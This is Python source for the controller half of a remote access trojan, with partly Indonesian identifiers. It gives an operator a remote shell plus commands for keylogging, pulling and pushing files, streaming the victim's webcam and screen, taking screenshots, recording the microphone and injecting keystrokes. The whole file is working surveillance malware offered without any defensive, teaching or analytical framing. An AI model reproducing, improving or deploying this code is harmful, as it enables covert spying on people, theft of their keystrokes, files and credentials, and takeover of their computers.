import socket
import json
import os
import struct
import pickle
import cv2
import threading
import wave
import pyaudio
import pyfiglet
import random
from colorama import Fore

# Create main socket server (controller side)
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('0.0.0.0', 9999))  # Listen on all interfaces, port 9999
print('[+] Waiting for connection')
soc.listen(1)

# Accept incoming connection from client
koneksi = soc.accept()
_target = koneksi[0]  # Socket object for communication
ip = koneksi[1]       # Client address
print(Fore.CYAN+f'[+] Connected to {str(ip)}')

# ================= IMAGE RECEIVER =================
def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
    # Server to receive a single image file over socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print(Fore.BLUE+"connecting")
    conn, addr = server.accept()
    print(Fore.RED+f"connected {addr}")

    # Receive image size (4 bytes)
    size_data = conn.recv(4)
    size = struct.unpack("!I", size_data)[0]

    # Receive image data in chunks
    data = b""
    while len(data) < size:
        packet = conn.recv(4096)
        if not packet:
            break
        data += packet

    # Save image to file
    with open(save_as, "wb") as f:
        f.write(data)

    print(Fore.BLUE+f'saved as {save_as}')

    conn.close()
    server.close()

# ================= SEND KEYSTROKE =================
def keystroke():
     # Server to send text input to client
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.bind(('0.0.0.0', 9995))
          s.listen(1)
          print(Fore.GREEN+'Connect')
          conn, addr= s.accept()
          with conn:
               print(Fore.CYAN+f'connected {addr}')
               while True:
                    command = input('text: ')
                    conn.sendall(command.encode())
                    break
     print(Fore.GREEN+'sent')

# ================= AUDIO RECEIVER =================
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024

def receive_and_save():
     # Receive audio stream and save as WAV file
     frames = []
     try:
          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
               s.bind(('0.0.0.0', 9996))
               s.listen(1)
               conn, addr = s.accept()
               with conn:
                    print(Fore.GREEN+f'connected {addr}')
                    while True:
                         data = conn.recv(CHUNK)
                         if not data:
                              break
                         frames.append(data)

          print(Fore.CYAN+'saving WAV file')
          WAVE_OUTPUT = 'retrieved_audio.wav'

          # Save audio frames into .wav file
          with wave.open(WAVE_OUTPUT, 'wb') as wf:
               wf.setnchannels(CHANNELS)
               wf.setsampwidth(2)
               wf.setframerate(RATE)
               wf.writeframes(b''.join(frames))

          print(f'{WAVE_OUTPUT}')

     except socket.error as e:
          print(f'{e}')

# ================= SCREEN SHARE =================
def screen_record(host="0.0.0.0", port=9999):
    # Receive live screen stream (frames serialized with pickle)
    MAX_WIDTH = 960
    MAX_HEIGHT = 540

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print("connecting")
    conn, addr = server.accept()
    print(f"connected {addr}") 

    data = b""
    payload_size = struct.calcsize("Q")  # Frame size header

    # Create resizable window
    cv2.namedWindow('Screen Share | Q / ESC = Quit', cv2.WINDOW_NORMAL)
    cv2.resizeWindow('Screen Share | Q / ESC = Quit', MAX_WIDTH, MAX_HEIGHT)

    while True:
        try:
            # Receive frame size
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet:
                    return 
                data += packet

            packed_size = data[:payload_size]
            data = data[payload_size:]
            frame_size = struct.unpack("Q", packed_size)[0]

            # Receive full frame data
            while len(data) < frame_size:
                data += conn.recv(4096)

            frame_data = data[:frame_size]
            data = data[frame_size:]

            # Deserialize frame
            frame = pickle.loads(frame_data)
            frame = cv2.resize(frame, (MAX_WIDTH, MAX_HEIGHT))
            
            # Display frame
            cv2.imshow("Screen Share | Q / ESC = Quit", frame)

            # Exit on Q or ESC
            key = cv2.waitKey(1) & 0xFF
            if key == ord('q') or key == 27:
                print("stopped")
                break

        except Exception as e:
            print("error", e)
            break

    conn.close()
    cv2.destroyAllWindows()

# ================= CAMERA STREAM =================
def konversi_byte_stream():
     # Receive camera stream frames
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(('0.0.0.0', 9998))
     sock.listen(1)

     konek = sock.accept()
     tg = konek[0]
     ip = konek[1]
     print(f'connected {ip}')

     bdata = b""
     payload_size = struct.calcsize("Q")

     while True:
          while(len(bdata)) < payload_size:
               packet = tg.recv(4*1024)
               if not packet: break
               bdata += packet

          packed_msg_size = bdata[:payload_size]
          bdata = bdata[payload_size:]
          msg_size = struct.unpack("Q", packed_msg_size)[0]

          while len(bdata) < msg_size:
               bdata += tg.recv(4*1024)

          frame_data = bdata[:msg_size]
          bdata =  bdata[msg_size:]

          frame = pickle.loads(frame_data)

          cv2.startWindowThread()
          cv2.imshow("streaming", frame)

          key = cv2.waitKey(1)
          if key & 0xFF == ord('q'):
               break 

     tg.close()
     cv2.destroyAllWindows()

def stream_cam():
     # Run camera stream in separate thread
     t = threading.Thread(target=konversi_byte_stream)
     t.start()

# ================= FILE TRANSFER =================
def upload_file(namafile):
     # Send file to client
     bufsize = 65536

     if not os.path.exists(namafile):
          _target.sendall(struct.pack("Q", 0))
          print(Fore.RED+'file not found')
          return

     filesize = os.path.getsize(namafile)
     _target.sendall(struct.pack("Q", filesize))

     with open(namafile, 'rb') as f:
        while True:
            data = f.read(bufsize)
            if not data:
                break
            _target.sendall(data)

def download_file(namafile):
     # Receive file from client
     bufsize = 65536

     size_data = _target.recv(8)
     filesize = struct.unpack("Q", size_data)[0]

     if filesize == 0:
          print(Fore.RED+'file not found')
          return 

     recv = 0
     with open(namafile, 'wb') as file:
        while recv < filesize:
                data = _target.recv(bufsize)
                if not data:
                    break
                file.write(data)
                recv += len(data)

# ================= RECEIVE JSON DATA =================
def data_diterima():
        # Receive JSON data reliably (handles fragmentation)
        data = ''
        while True:
            try:
                data = data + _target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                 continue

# ================= MAIN SHELL =================
def shellc():                      
    n = 0
    print(Fore.BLUE+"Type 'help' for help")

    while True:
        try:
          # Get command from user
          perintah = input(Fore.GREEN+'shell> ')

          # Send command to client
          data = json.dumps(perintah)
          _target.send(data.encode())

          # Exit commands
          if perintah in ('exit','quit'):
              break

          # Clear terminal
          elif perintah == 'clear':
             os.system('clear')

          # Change directory (handled on client)
          elif perintah[:3] == 'cd ':
             pass

          # File transfer commands
          elif perintah[:8] == 'download':
             download_file(perintah[9:])
          elif perintah[:6] == 'upload':
             upload_file(perintah[7:])

          # Keylogger commands (client-side execution)
          elif perintah == 'start_log':
             print('starting keylogger')
          elif perintah == 'baca_log':
             data = _target.recv(1024).decode()
             print(data)
          elif perintah == 'clear_log':
             pass  
          elif perintah == 'stop_log':
             print('stopping keylogger')

          # Camera / screen features
          elif perintah == 'start_cam':
             stream_cam()
          elif perintah ==  'screen_shot':
             n += 1
             download_file("ss"+str(n)+".png")
          elif perintah == 'screen_share':
              screen_record(host='0.0.0.0', port=9991)

          # Audio recording
          elif perintah == 'rec_audio':
             receive_and_save()

          # Send keystrokes to client
          elif perintah == 'send_key':
             keystroke()

          # Capture single image
          elif perintah == 'snap_cam':
             start_image_server()

          # Display banner
          elif perintah == 'banner':
             list_banner = [
                 pyfiglet.figlet_format('SHELL', font='slant'),
                 pyfiglet.figlet_format('SHELL', font='3-d'),
                 pyfiglet.figlet_format('SHELL', font='standard'),
                 pyfiglet.figlet_format('SHELL', font='banner')
             ]
             print(random.choice(list_banner))

          # Help menu
          elif perintah == 'help':
             print("... help menu ...")

          # Default → print response from client
          else:
             hasil = data_diterima()
             print(hasil)

        # Handle connection errors
        except (ConnectionResetError, BrokenPipeError,
                ConnectionRefusedError, ConnectionError,
                ConnectionAbortedError):
            print('Connection error')
            break  

        except KeyboardInterrupt:
            print("exiting...")
            break  

# Start main shell loop
shellc()
